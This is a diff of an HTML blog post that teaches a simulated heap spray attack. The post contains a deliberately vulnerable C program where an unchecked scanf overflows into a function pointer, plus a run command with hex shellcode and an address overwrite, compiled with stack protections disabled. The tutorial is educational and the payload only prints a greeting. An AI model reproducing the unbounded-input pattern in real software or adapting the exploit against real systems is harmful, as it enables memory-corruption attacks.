@@ -96,6 +96,7 @@
     <li><a href="#how-do-we-tackle-the-randomize_va_space">How do we tackle the randomize_va_space?</a></li>
     <li><a href="#lets-try-it">Lets try it</a></li>
     <li><a href="#conclusions">Conclusions</a></li>
+    <li><a href="#notes">Notes</a></li>
   </ul>
 </nav><h2 id="tldr-just-give-me-the-code">TL;DR just give me the code</h2>
 <p>The code is right here:</p>
@@ -109,7 +110,8 @@
 }
 
 <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
-    <span style="color:#75715e">// user_input would be dynamically allocated on the heap at runtime, but we can statically do it right now to keep the program simple
+    <span style="color:#75715e">// user_input would be dynamically allocated on the heap at runtime
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// but we can just hit the heap right away
 </span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> simulated_user_input <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">1000000</span>);
 
     scanf(<span style="color:#e6db74">&#34;%s&#34;</span>, simulated_user_input);
@@ -120,7 +122,9 @@
 
     printf(<span style="color:#e6db74">&#34;Simulated user input</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, simulated_user_input);
     printf(<span style="color:#e6db74">&#34;Buffer for overflow</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
-    printf(<span style="color:#e6db74">&#34;Function pointer</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, function_pointer);
+    <span style="color:#75715e">// note if you want the address of this pointer you need &amp;function_pointer,
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">// I forgot to change it in my tests so I&#39;m leaving it so no one is confused
+</span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74">&#34;Function pointer</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74"> 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, function_pointer);
 
     <span style="color:#75715e">// corrupt the function pointer with the buffer overflow
 </span><span style="color:#75715e"></span>    scanf(<span style="color:#e6db74">&#34;%s&#34;</span>, buffer);
@@ -146,7 +150,7 @@
 <p><strong>Run instructions:</strong></p>
 <pre><code>$ python -c print('\xe9\x1e\x00\x00\x00\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x590\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xdd\xff\xff\xffhello_friends\x0d\r\n' + ('A' * 64 + '\x60\xb1\x04\x08'))&quot; | ./heap_spray_user_input
 </code></pre>
-<p>*You will likely need to change the final hex code <code>\x60\xb1\x04\x08</code> to be whatever your &ldquo;user_input&rdquo; address is. Notice the address is printing in reverse due to the endianess of my machine.</p>
+<p>*You will likely need to change the final hex code <code>\x60\xb1\x04\x08</code> to be whatever your &ldquo;simulated_user_input&rdquo; address is. Notice the address is in reverse due to the endianess of my machine.</p>
 <h2 id="how-does-your-code-work">How does your code work?</h2>
 <ol>
 <li>We place shellcode on the heap
@@ -165,14 +169,14 @@
 </ul>
 </li>
 </ol>
-<p>A buffer overflow exploits the way memory is allocated on the stack. As you assign variables in your program, they get added on the stack. Not all variables are allocated this way. Things like <code>malloc</code> will use the heap. But typically buffer overflow deals with the stack.</p>
-<p>This buffer is placed on the stack:</p>
+<p>A buffer overflow exploits the way memory is allocated on the stack. As you assign variables in your program, they get added on the stack. Not all variables are allocated this way. Things like <code>malloc</code> will use the heap. But typically buffer overflow deals with the stack. When variables get placed on the stack, they are usually sharing a very &ldquo;tight&rdquo; space. All of their addresses butt up against eachother.</p>
+<p>For example, this buffer is placed on the stack:</p>
 <pre><code>char buffer[64];
-</code></pre><p>Lets pretend it has an address of <code>0xffc8c7d8</code>.</p>
+</code></pre><p>It could have an address of <code>0xffc8c7d8</code>.</p>
 <p>The function pointer is also placed on the stack:</p>
 <pre><code>volatile int (*function_pointer)();
-</code></pre><p>Lets pretend it has an address of <code>0xffc8c818</code>.</p>
-<p>See how the function pointer is adjacent to the buffer address? That means if we enter more than 64 values into the buffer, they&rsquo;ll start to overflow into the function pointer. That&rsquo;s why our Python code has this bit: <code>('A' * 64 + '\x10\x30\x41\xf7')</code>. Since our code doesn&rsquo;t check input size into our buffer, we can take advantage of a buffer overflow. We fill the buffer with 64 &lsquo;A&rsquo;s and we tack on a little endian address. That will change our function pointer to point to that new address.</p>
+</code></pre><p>It could have an address of <code>0xffc8c818</code>.</p>
+<p>See how the function pointer is adjacent to the buffer address? That means if we enter more than 64 char values into the buffer, they&rsquo;ll start to overflow into the function pointer. That&rsquo;s why our Python code has this bit: <code>('A' * 64 + '\x10\x30\x41\xf7')</code>. Since our code doesn&rsquo;t check input size into our buffer, we can take advantage of a buffer overflow. We fill the buffer with 64 &lsquo;A&rsquo;s and we tack on a little endian address. That will change our function pointer to point to that new address.</p>
 <p>Once we can control the function pointer, we now just want to point that pointer to the heap.</p>
 <h2 id="why-is-it-called-heap-spray">Why is it called heap spray?</h2>
 <p>Why do we call it heap <em>spray</em>? Because modern operating systems are aware of exploiting memory addresses. They are <em>really</em> aware of stack abuse. That&rsquo;s why when we compile the program for the demo, we use these flags: <code>-fno-stack-protector -z execstack -m32</code>. We turn off stack protection, turn on stack execution, and compile in 32 bit mode to simplify the address space. That makes my demo much easier to perform since it makes the buffer overflow possible. In the real world a lot of these flags would not be set if you wanted secure address spaces. But even with all of those flags on, our sample code will not work 99.9999% of the time. Why? Because the stack isn&rsquo;t the only space that&rsquo;s protected. The heap is also randomized and if you want to change that you need to set this flag:</p>
@@ -224,6 +228,12 @@ ATTEMPT 3: HIT
 <p>The stack protection features on GCC and other compilers make exploiting things like Buffer Overflows and Heap Spray difficult. However, GCC does not have a lot of these security features on by default (unless you&rsquo;re in Linux). Spraying the heap is an interesting statistical exploit. Since we&rsquo;re attempting to reduce entropy, we sort of have to get lucky when we&rsquo;re executing my demo. It usually triggers 1/3 times. I am not sure if a typical heap spray attack is that unpredictable, but I imagine it&rsquo;s never 100% effective since there is always room to guess the wrong address.</p>
 <p>Heap sprays are responsible for ETERNAL BLUE and WannaCrypt attacks, which - to me - makes them a pretty powerful tool in the exploit belt. I <em>think</em> the reason you would use a heap spray is when you have access to the buffer overflow, but the buffer overflow exploit doesn&rsquo;t provide you with a vector to perfom the execution of malicious shellcode. If you have access to the heap (which many programs provide), then suddenly you have a new vector for creating any malicious code you want. Getting a shell becomes trivial in these scenarios.</p>
 <p>I&rsquo;m mostly posting this so that someone has access to functional C code that (vaguely) simulates a Heap Spray attack. I had a hell of a time finding a simple, reproduceable, example of a shellcode exploit and hopefully someone, someday, finds this useful.</p>
+<h2 id="notes">Notes</h2>
+<ol>
+<li>You do not need a function pointer to make this work. But having a function pointer makes it easier to debug. Another possible vector is corrupting the EIP register, which is used to control the flow of the program. Changing the EIP (as I understand it) is much more common for a real world exploit.</li>
+<li>Sorry about the function pointer addresses being printed out. I forgot about it while I was debugging. What I&rsquo;m printing out is the address of the thing the function pointer is pointing to, as a way to show the address gets corrupted.</li>
+<li>I&rsquo;m still learning so I might not have dived deep enough into these concepts out of a fear of misrepresenting them. Please take my post with a grain (or two) of salt.</li>
+</ol>
 
 
       
